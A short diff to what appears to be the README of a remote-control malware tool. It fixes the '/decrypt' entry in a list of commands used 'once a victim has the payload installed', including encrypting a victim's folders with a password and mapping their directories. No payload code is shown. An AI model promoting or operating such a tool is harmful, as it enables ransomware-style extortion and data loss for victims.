@@ -57,7 +57,7 @@ Once a victim has the payload installed on their system, you have these commands
 * `/system-info` - Shows info about the victims pc.
 * `/help` - Brings up a help menue with all the commands and their functions. 
 * `/encrypt` - Encrypts a set path of your choosing with a password of your choosing, ie `/encrypt -p 1234 -f "C:\Users\James\Desktop"`
-* `decrypt` - Decrypts a set path you has set during encryption using a password you had set during encryption, ie `/decrypt -p 1234 -f "C:\Users\James\Desktop"`
+* `/decrypt` - Decrypts a set path you has set during encryption using a password you had set during encryption, ie `/decrypt -p 1234 -f "C:\Users\James\Desktop"`
 * `/tree` - Maps system Directories of a given path, ie `/tree "C:\"`
 
 ## The Installer: 
